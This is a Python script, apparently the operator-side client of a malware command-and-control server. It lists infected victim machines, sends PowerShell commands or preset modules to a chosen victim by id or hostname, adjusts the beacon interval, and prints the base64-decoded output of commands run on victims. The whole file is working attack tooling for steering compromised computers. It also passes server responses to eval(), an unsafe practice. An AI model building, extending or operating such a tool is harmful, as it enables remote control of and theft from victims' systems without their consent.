import requests
import argparse
from base64 import b64decode as dec
def argser():
    parser = argparse.ArgumentParser(description='Manage c2 Server')
    parser.add_argument("-u","--url", default="http://127.0.0.1:5000", help="URL of the c2 server")
    parser.add_argument("--secret",default="secret", help="secret set in the c2 server")
    parser.add_argument("-l", "--list", action='store_true', help="list infected machines")
    parser.add_argument("-lc", "--listcmd", action='store_true', help="list run commands and their outputs")
    parser.add_argument("-i", "--id", help="id of the infected victim")
    parser.add_argument("-H","--hostname", help="hostname of the infected victim")
    parser.add_argument("-s","--set", action='store_true', help="set command or delta")
    parser.add_argument("-c","--cmd", help="powershell cmd to run on the victim or name of a preset module")
    parser.add_argument("-d","--delta",help="time separating http requests from the victim")
    #parser.add_argument("--getpath",help="download a file from the victim")
    return parser.parse_args()
    

args = argser()


json={"secret":args.secret}
if args.id:json["id"]=args.id
if args.hostname:json["hostname"]=args.hostname
if args.cmd:json["cmd"]=args.cmd
if args.delta:json["delta"]=args.delta
URL=args.url 
if args.list:
    URL += "/list"
elif args.listcmd:
    URL += "/listcmd"
elif args.set:
    URL += "/set"

print(r:=requests.get(URL, json=json).text)

if args.listcmd:
    for i in eval(r):
        print("********************************************")
        print(i["cmd"])
        try:
            print(dec(i["output"]).decode())
        except:
            print(i["output"])
        
